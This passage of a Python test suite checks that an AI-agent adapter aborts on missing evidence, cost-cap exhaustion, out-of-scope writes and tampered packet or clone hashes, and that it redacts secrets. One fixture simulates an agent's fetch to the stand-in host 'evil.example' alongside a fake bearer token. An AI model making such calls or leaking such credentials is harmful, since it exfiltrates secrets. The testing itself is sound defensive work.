    adapter = _adapter(query_fn=make_query_fn(_happy_events()), session_auditor=auditor)
    request = _request(tmp_path)
    adapter.execute(request)
    assert auditor.confirm_calls


def test_normal_completion_with_unconfirmed_session_end_aborts(tmp_path):
    """[BEHAVIORAL][S12][S6.2] A successful-looking completion whose session cannot be
    confirmed ended must still abort -- "confirmed clean end" is mandatory, not cosmetic."""
    auditor = FakeSessionAuditor(confirmed=False)
    adapter = _adapter(query_fn=make_query_fn(_happy_events()), session_auditor=auditor)
    request = _request(tmp_path)
    with pytest.raises(_api().ClaudeAgentAdapterBlockedError):
        adapter.execute(request)


# --- 9. Missing sandbox/tool-scope evidence -------------------------------------------

def test_missing_tool_scope_evidence_from_prover_aborts(tmp_path):
    """[BEHAVIORAL][S12] A tool-scope prover that returns incomplete/invalid evidence
    (missing sdk_enforced, mechanism, or policy_hash) must abort -- an OS/SDK-level
    enforcement receipt is required, not merely claimed."""
    prover = FakeToolScopeProver(receipt_overrides={"sdk_enforced": None})
    adapter = _adapter(query_fn=make_query_fn(_happy_events()), tool_scope_prover=prover)
    request = _request(tmp_path)
    with pytest.raises(_api().ClaudeAgentAdapterBlockedError):
        adapter.execute(request)


def test_tool_scope_prover_raising_is_treated_as_missing_evidence_not_swallowed(tmp_path):
    """[BEHAVIORAL][S12] If the tool-scope prover itself raises, that must surface as
    missing sandbox/tool-scope evidence, never be silently swallowed into a pass."""
    prover = FakeToolScopeProver(raise_on_probe=RuntimeError("prover unavailable"))
    adapter = _adapter(query_fn=make_query_fn(_happy_events()), tool_scope_prover=prover)
    request = _request(tmp_path)
    with pytest.raises(_api().ClaudeAgentAdapterBlockedError):
        adapter.execute(request)


# --- 10. Missing usage/model evidence --------------------------------------------------

def test_missing_configured_model_is_unknown_and_aborts(tmp_path):
    """[BEHAVIORAL][S12][S4.3] A result event missing the configured model is UNKNOWN and
    aborts -- never silently defaulting to the requested model."""
    events = [_result_event(omit_model=True)]
    adapter = _adapter(query_fn=make_query_fn(events))
    request = _request(tmp_path)
    with pytest.raises(_api().ClaudeAgentAdapterBlockedError):
        adapter.execute(request)


def test_missing_usage_is_unknown_never_zero_and_aborts(tmp_path):
    """[BEHAVIORAL][S12][S4.2] Missing usage telemetry is UNKNOWN, never coerced to zero,
    and aborts the call (mirrors the Codex adapter's identical discipline)."""
    events = [_result_event(omit_usage=True)]
    adapter = _adapter(query_fn=make_query_fn(events))
    request = _request(tmp_path)
    with pytest.raises(_api().ClaudeAgentAdapterBlockedError):
        adapter.execute(request)


def test_emitted_model_differing_from_requested_is_unknown_and_aborts(tmp_path):
    """[BEHAVIORAL][S12][S4.3] An emitted configured model that differs from the request
    is recorded UNKNOWN and aborts comparative scoring -- the requested value must never
    be copied into the observed-identity field."""
    events = [_result_event(model="claude-opus-4-8")]  # request asked for sonnet-5
    adapter = _adapter(query_fn=make_query_fn(events))
    request = _request(tmp_path, model="claude-sonnet-5")
    with pytest.raises(_api().ClaudeAgentAdapterBlockedError):
        adapter.execute(request)


# --- 11. Out-of-scope write signal ----------------------------------------------------

def test_out_of_scope_write_signal_during_dispatch_aborts(tmp_path):
    """[BEHAVIORAL][SECURITY-ORACLE][S12][S4.3] A live tool-use event reporting a write
    target outside the sealed allowlist aborts the call even though the frozen packet
    itself was validly sealed -- this is a dynamic signal, distinct from the static
    packet-policy rejection test above."""
    request = _request(tmp_path)
    events = [
        {"type": "tool_use", "tool_name": "Write", "cwd": request.clone_path,
         "write_targets": ["/private/tmp/definitely-out-of-scope.txt"]},
        _result_event(),
    ]
    adapter = _adapter(query_fn=make_query_fn(events))
    with pytest.raises(_api().ClaudeAgentAdapterBlockedError):
        adapter.execute(request)


# --- 12. Cap exhaustion integration (ledger raises -> adapter aborts) -----------------

def test_ledger_reserve_exhaustion_aborts_before_any_sdk_call(tmp_path):
    """[BEHAVIORAL][S12][S4.2] When the injected ledger cannot reserve (calls/seconds/
    tokens/USD cap exhausted), the adapter must abort before ever invoking query()."""
    capture: List[Any] = []
    query_fn = make_query_fn(_happy_events(), capture=capture)
    ledger = FakeLedger(reserve_error=RuntimeError("combined pilot cap exhausted"))
    adapter = _adapter(query_fn=query_fn, ledger=ledger)
    request = _request(tmp_path)
    with pytest.raises(_api().ClaudeAgentAdapterBlockedError):
        adapter.execute(request)
    assert capture == []


def test_ledger_reconcile_failure_still_surfaces_as_blocked(tmp_path):
    """[BEHAVIORAL][S12][S4.2] A reconciliation failure (e.g. observed tokens exceed the
    per-call cap) must surface as blocked, not be swallowed after a successful call."""
    ledger = FakeLedger(reconcile_error=RuntimeError("per-call observed-token cap exceeded"))
    adapter = _adapter(query_fn=make_query_fn(_happy_events()), ledger=ledger)
    request = _request(tmp_path)
    with pytest.raises(_api().ClaudeAgentAdapterBlockedError):
        adapter.execute(request)


# --- 13. Secret redaction --------------------------------------------------------------

@pytest.mark.parametrize("secret_text", [
    "Authorization: Bearer " "sk-ant" "-api03-super-secret-token-value",
    "ANTHROPIC_API_KEY=" "sk-ant" "-api03-another-secret",
    "access_token: sk-ant-oat01-leaked",
])
def test_secret_redaction_scrubs_retained_artifacts(tmp_path, secret_text):
    """[BEHAVIORAL][SECURITY-ORACLE][S12] Authorization headers / API keys / access tokens
    observed in raw output must never appear in retained artifacts."""
    events = [_result_event(final_output="ok")]
    events[0]["raw_stderr"] = secret_text
    adapter = _adapter(query_fn=make_query_fn(events))
    request = _request(tmp_path)
    result = adapter.execute(request)
    serialized = json.dumps(result.raw_observation, default=str)
    assert "sk-ant" not in serialized
    assert "Bearer" not in serialized or "[REDACTED]" in serialized


def test_secret_redaction_applies_even_on_the_abort_path(tmp_path):
    """[BEHAVIORAL][SECURITY-ORACLE][S12] Redaction must also apply to the retained
    observation on an ABORTED call, not only on success -- a blocked dispatch still
    retains evidence and that evidence must be scrubbed."""
    events = [{"type": "tool_use", "tool_name": "WebFetch",
               "input": {"url": "https://evil.example"},
               "cwd": None,
               "raw_stderr": "Authorization: Bearer " "sk-ant" "-api03-secret-on-abort"}]
    adapter = _adapter(query_fn=make_query_fn(events))
    request = _request(tmp_path)
    with pytest.raises(_api().ClaudeAgentAdapterBlockedError) as excinfo:
        adapter.execute(request)
    observation = getattr(excinfo.value, "observation", {})
    assert "sk-ant" "-api03-secret-on-abort" not in json.dumps(observation, default=str)


# --- 14. Fable-5 data-retention PRECHECK_FAILED handling ------------------------------
#
# STALE-PREFLIGHT-ASSUMPTION CORRECTION (see the coder's dispatch report for full
# detail): both tests below originally constructed a ClaudeAgentCompatibilityPreflight
# directly and expected the PREFLIGHT ITSELF to classify a Fable-5 400 as the
# data-retention precheck. That assumed the pre-round-4 preflight design, where the
# preflight made real probe dispatches per model. This spec's round-4 rewrite of
# Section 6.1 makes the preflight entirely inert (zero real Claude Agent SDK dispatches
# of any kind, not even a probe) and explicitly states the Fable-5 data-retention
# signal "cannot be verified directly" inertly at all -- Section 4.3 defers it to
# "that specific call" (the real P3 challenger Fable-5 dispatch), never to the
# preflight. These two tests now exercise ClaudeAgentAdapter.execute()'s real
# dispatch-time error classification instead, which is where the current spec actually
# places this check -- the same underlying property (a 400 invalid_request_error on
# Fable-5 must be distinctly, non-generically classified; any other error must not be
# misclassified as retention) is preserved, just at the correct layer.

def test_fable5_data_retention_400_at_real_dispatch_is_precheck_failed_not_generic_call_failure(
        tmp_path):
    """[BEHAVIORAL][S4.3][S12] A 400 invalid_request_error on a real claude-fable-5
    dispatch is classified PRECHECK_FAILED with a data-retention-specific failure code
    -- never a generic call failure, and never phrased as a claim about Fable 5's
    capability."""
    def query_fn(prompt, options):
        raise FakeSDKAPIError(400, "invalid_request_error", "data retention too short")

    adapter = _adapter(query_fn=query_fn)
    request = _request(tmp_path, model="claude-fable-5")
    with pytest.raises(_api().ClaudeAgentAdapterBlockedError) as excinfo:
        adapter.execute(request)
    observation = getattr(excinfo.value, "observation", {}) or {}
    dispatch_error = observation.get("dispatch_error", {}) if isinstance(observation, dict) else {}
    failure_code = str(dispatch_error.get("failure_code", ""))
    combined_upper = (str(excinfo.value) + " " + json.dumps(observation, default=str)).upper()
    assert "RETENTION" in combined_upper
    assert "GENERIC" not in failure_code.upper()
    combined_lower = combined_upper.lower()
    assert "fable 5 cannot" not in combined_lower
    assert "fable-5 cannot" not in combined_lower


def test_fable5_other_errors_at_real_dispatch_are_generic_call_failures_not_misclassified_as_retention(
        tmp_path):
    """[BEHAVIORAL][S4.3] A non-400 / non-retention error on a real claude-fable-5
    dispatch must NOT be misclassified as the data-retention precheck -- only the
    specific 400 invalid_request_error signature maps to that condition."""
    def query_fn(prompt, options):
        raise FakeSDKAPIError(500, "internal_server_error", "unrelated outage")

    adapter = _adapter(query_fn=query_fn)
    request = _request(tmp_path, model="claude-fable-5")
    with pytest.raises(_api().ClaudeAgentAdapterBlockedError) as excinfo:
        adapter.execute(request)
    observation = getattr(excinfo.value, "observation", {}) or {}
    dispatch_error = observation.get("dispatch_error", {}) if isinstance(observation, dict) else {}
    assert dispatch_error.get("failure_code") != "FABLE5_DATA_RETENTION_PRECHECK_FAILED"
    assert dispatch_error.get("data_retention_ok_fable5") is not False


# --- 15. Unresolvable/failed/stale runtime price-rate lookup --------------------------

def test_stale_price_rate_lookup_is_rejected(tmp_path):
    """[BEHAVIORAL][S1.1][S4.3][S12] A rate lookup older than the freshness window is
    rejected -- never a hardcoded stale rate used silently."""
    api = _api()
    stale_checked_at = 1_000_000.0  # far in the past relative to the fake clock
    rate_lookup = lambda model: {
        "input_usd_per_mtok": 3.0, "output_usd_per_mtok": 15.0,
        "checked_at": stale_checked_at, "source": "cached-rate-table",
    }
    with pytest.raises(api.ClaudeAgentAdapterBlockedError, match="stale|fresh"):
        api.resolve_current_usd_rate(
            "claude-sonnet-5", rate_lookup=rate_lookup,
            clock=lambda: 1_753_000_000.0, max_age_seconds=86400,
        )


def test_failed_price_rate_lookup_is_rejected(tmp_path):
    """[BEHAVIORAL][S1.1][S4.3][S12] A rate lookup that raises must be rejected, not
    silently treated as zero cost."""
    api = _api()

    def raising_lookup(model):
        raise RuntimeError("rate table unavailable")

    with pytest.raises(api.ClaudeAgentAdapterBlockedError):
        api.resolve_current_usd_rate(
            "claude-sonnet-5", rate_lookup=raising_lookup, clock=lambda: 1_753_000_000.0,
        )


def test_unresolvable_price_rate_lookup_for_unknown_model_is_rejected(tmp_path):
    """[BEHAVIORAL][S1.1][S4.3][S12] A rate lookup returning nothing usable for the given
    model is unresolvable and must be rejected."""
    api = _api()
    rate_lookup = lambda model: None
    with pytest.raises(api.ClaudeAgentAdapterBlockedError):
        api.resolve_current_usd_rate(
            "claude-sonnet-5", rate_lookup=rate_lookup, clock=lambda: 1_753_000_000.0,
        )


def test_fresh_price_rate_lookup_succeeds_and_feeds_authoritative_per_call_cost(tmp_path):
    """[BEHAVIORAL][S1.1][S13] A fresh, resolvable rate feeds a real computed per-call USD
    cost into the dispatch report surface, with the rate and freshness citation retained."""
    now = 1_753_000_000.0
    rate_lookup = lambda model: {
        "input_usd_per_mtok": 3.0, "output_usd_per_mtok": 15.0,
        "checked_at": now, "source": "claude-api-skill-model-table",
    }
    adapter = _adapter(query_fn=make_query_fn(_happy_events()), rate_lookup=rate_lookup,
                        clock=lambda: now)
    request = _request(tmp_path)
    result = adapter.execute(request)
    usd = result.report_surface["usd_cost"]
    assert usd is not None
    expected = (100 / 1_000_000) * 3.0 + (40 / 1_000_000) * 15.0
    assert usd["amount_usd"] == pytest.approx(expected, rel=1e-9)
    assert usd["per_token_rate"]["source"] == "claude-api-skill-model-table"
    assert usd["rate_checked_at"] == now


# --- 16. Clone or packet byte mismatch -------------------------------------------------

def test_packet_hash_mismatch_is_rejected(tmp_path):
    """[BEHAVIORAL][SECURITY-ORACLE][S12][S8] A packet whose stored hash no longer equals
    its recomputed canonical hash (tampered after sealing) is rejected."""
    request = _request(tmp_path)
    packet = dict(request.frozen_packet)
    packet["packet_hash"] = "f" * 64  # deliberately wrong
    request = replace(request, frozen_packet=packet)
    adapter = _adapter(query_fn=make_query_fn(_happy_events()))
    with pytest.raises(_api().ClaudeAgentAdapterBlockedError):
        adapter.execute(request)


def test_clone_tree_hash_mismatch_is_rejected(tmp_path):
    """[BEHAVIORAL][SECURITY-ORACLE][S12][S8] A clone tree whose recomputed deterministic
    hash differs from the packet's sealed clone_tree_hash (byte mismatch between clone
    and its seal) is rejected before dispatch."""
    api = _api()
    request = _request(tmp_path)
    packet = dict(request.frozen_packet)
    packet["clone_tree_entries"] = [{"path": "mutated.txt", "sha256": "0" * 64}]
    # clone_tree_hash intentionally left stale relative to the mutated entries.
    packet["packet_hash"] = packet["reverified_packet_hash"] = api.canonical_packet_hash(packet)
    request = replace(request, frozen_packet=packet)
    adapter = _adapter(query_fn=make_query_fn(_happy_events()))
    with pytest.raises(api.ClaudeAgentAdapterBlockedError):
        adapter.execute(request)


def test_real_filesystem_clone_mutation_diverging_from_seal_is_rejected(tmp_path):
    """[BEHAVIORAL][SECURITY-ORACLE][S12][S8][S6.2][AC5] A REAL, on-disk clone that has
    diverged from its sealed content-tree manifest is rejected in production
    (test_mode=False), even though the packet's own in-memory clone_tree_entries stay
    perfectly self-consistent with its own clone_tree_hash the entire time.

    This is the gap `test_clone_tree_hash_mismatch_is_rejected` above does NOT cover:
    that test only ever mutates the in-memory `clone_tree_entries` dict, so it proves
    only that the packet is self-consistency-checked against itself -- never that the
    real filesystem at `request.clone_path` is ever independently re-read. This test
    reproduces exactly what an external verifier's reproduction script did: build a
    real clone directory with real content, seal a packet whose clone_tree_hash
    genuinely reflects that real content (via `_preparation_tree_entries`, the same
    helper production code reuses -- never a fictional/mismatched entry), prove the
    matching seal is accepted, then mutate the REAL clone directory on disk without
    updating the sealed hash at all, and confirm the now-diverged clone is rejected."""
    from runner.codex_subscription_pilot import _preparation_tree_entries

    api = _api()
    request = _request(tmp_path)
    clone_path = Path(request.clone_path)

    # Seed the clone with REAL content on disk, matching the packet's seal exactly --
    # unlike the shared `_base_packet` fixture's own clone_tree_entries (a fictional,
    # self-consistent-only in-memory pair that was never written to real disk bytes).
    (clone_path / "real_file.txt").write_text("original sealed content\n", encoding="utf-8")
    real_entries = _preparation_tree_entries(str(clone_path))
    real_clone_tree_hash = api.deterministic_tree_hash(real_entries)

    packet = dict(request.frozen_packet)
    packet["clone_tree_entries"] = real_entries
    packet["clone_tree_hash"] = real_clone_tree_hash
    packet["reverified_clone_tree_hash"] = real_clone_tree_hash
    packet["baseline_tree_hash"] = real_clone_tree_hash
    packet["packet_hash"] = packet["reverified_packet_hash"] = api.canonical_packet_hash(packet)
    request = replace(request, frozen_packet=packet)

    adapter = _adapter(query_fn=make_query_fn(_happy_events()), test_mode=False)

    # Prove the setup itself is genuinely valid first: a clone that matches its seal
    # must be accepted, so the mutation below is provably the sole cause of rejection,
    # not a coincidental, unrelated setup mistake.
    adapter.execute(request)

    # Now mutate the REAL clone directory on disk -- add a genuinely new file -- with
    # the packet's sealed clone_tree_hash/clone_tree_entries left completely untouched.
    (clone_path / "unsealed_extra_file.txt").write_text("not part of the seal\n", encoding="utf-8")

    with pytest.raises(api.ClaudeAgentAdapterBlockedError):
        adapter.execute(request)


def test_reverified_packet_hash_diverging_from_packet_hash_is_rejected(tmp_path):
    """[BEHAVIORAL][SECURITY-ORACLE][S12][S8] packet_hash and reverified_packet_hash must
    agree; any divergence is a byte mismatch and is rejected."""
    request = _request(tmp_path)
    packet = dict(request.frozen_packet)
    packet["reverified_packet_hash"] = "e" * 64
    request = replace(request, frozen_packet=packet)
    adapter = _adapter(query_fn=make_query_fn(_happy_events()))
    with pytest.raises(_api().ClaudeAgentAdapterBlockedError):
        adapter.execute(request)


# --- module sanity: canonical helpers --------------------------------------------------

def test_canonical_hash_helpers_are_deterministic_and_order_independent():
    """[DOC] canonical_bytes/canonical_hash sort keys so field order never affects the
    hash -- required for every byte-mismatch test above to be meaningful."""
    api = _api()
    a = {"z": 1, "a": 2}
    b = {"a": 2, "z": 1}
    assert api.canonical_hash(a) == api.canonical_hash(b)
    assert api.is_sha256(api.canonical_hash(a))
    assert not api.is_sha256("not-a-hash")


def test_module_imports_without_requiring_the_real_claude_agent_sdk_package(monkeypatch):
    """[BEHAVIORAL] Importing runner.claude_agent_adapter must not require the real
    claude-agent-sdk package to be installed -- fake-SDK injection is explicit (Section
    11 point 1); only a real, non-test-mode dispatch may need it. This test actively
    blocks ``import claude_agent_sdk`` and proves the module still imports cleanly."""
    import builtins
    real_import = builtins.__import__

    def blocking_import(name, *args, **kwargs):
        if name == "claude_agent_sdk" or name.startswith("claude_agent_sdk."):
            raise ImportError("claude_agent_sdk must not be required at module import time")
        return real_import(name, *args, **kwargs)

    monkeypatch.setattr(builtins, "__import__", blocking_import)
    sys.modules.pop("runner.claude_agent_adapter", None)
    importlib.import_module("runner.claude_agent_adapter")


def test_smoke_role_forbids_every_tool_event_and_requires_exact_literal_output(tmp_path):
    """[BEHAVIORAL][S6.3] The smoke packet forbids every tool event, even ones that would
    otherwise classify ALLOWED_LOCAL, and requires the exact literal final output
    CLAUDE_SMOKE_OK."""
    api = _api()
    smoke_cwd = tmp_path / ("claude-product-pilot-smoke-%s" % uuid.uuid4())
    smoke_cwd.mkdir()
    request = _request(tmp_path, role="smoke", model="claude-haiku-4-5",
                        tool_scope="read_only", ordinal=0, case_id="smoke")
    request = replace(request, clone_path=str(smoke_cwd), prompt=(
        "Return exactly CLAUDE_SMOKE_OK. Do not use tools, run commands, edit files, or "
        "contact external services beyond this response."
    ))
    packet = dict(request.frozen_packet)
    packet["cwd"] = str(smoke_cwd)
    packet["forbid_tool_events"] = True
    packet["expected_final_output"] = "CLAUDE_SMOKE_OK"
    packet["packet_hash"] = packet["reverified_packet_hash"] = api.canonical_packet_hash(packet)
    request = replace(request, frozen_packet=packet)

    # Even a read-only local event must abort under the smoke's zero-tool-event policy.
    events_with_tool = [
        {"type": "tool_use", "tool_name": "Read", "cwd": str(smoke_cwd),
         "path": "harmless.txt", "write_targets": []},
        _result_event(model="claude-haiku-4-5", final_output="CLAUDE_SMOKE_OK"),
    ]
    adapter = _adapter(query_fn=make_query_fn(events_with_tool))
    with pytest.raises(api.ClaudeAgentAdapterBlockedError):
        adapter.execute(request)

    # A clean run with no tool events and the exact literal output succeeds.
    clean_events = [_result_event(model="claude-haiku-4-5", final_output="CLAUDE_SMOKE_OK")]
    adapter = _adapter(query_fn=make_query_fn(clean_events))
    result = adapter.execute(request)
    assert result.final_output == "CLAUDE_SMOKE_OK"


def test_smoke_role_wrong_final_output_is_rejected(tmp_path):
    """[BEHAVIORAL][S6.3] Any output other than the exact literal CLAUDE_SMOKE_OK fails
    the smoke's exact-output contract."""
    api = _api()
    smoke_cwd = tmp_path / ("claude-product-pilot-smoke-%s" % uuid.uuid4())
    smoke_cwd.mkdir()
    request = _request(tmp_path, role="smoke", model="claude-haiku-4-5",
                        tool_scope="read_only", ordinal=0, case_id="smoke")
    request = replace(request, clone_path=str(smoke_cwd), prompt=(
        "Return exactly CLAUDE_SMOKE_OK. Do not use tools, run commands, edit files, or "
        "contact external services beyond this response."
    ))
    packet = dict(request.frozen_packet)
    packet["cwd"] = str(smoke_cwd)
    packet["forbid_tool_events"] = True
    packet["expected_final_output"] = "CLAUDE_SMOKE_OK"
    packet["packet_hash"] = packet["reverified_packet_hash"] = api.canonical_packet_hash(packet)
    request = replace(request, frozen_packet=packet)
    events = [_result_event(model="claude-haiku-4-5", final_output="Sure! CLAUDE_SMOKE_OK, done.")]
    adapter = _adapter(query_fn=make_query_fn(events))
    with pytest.raises(api.ClaudeAgentAdapterBlockedError):
        adapter.execute(request)
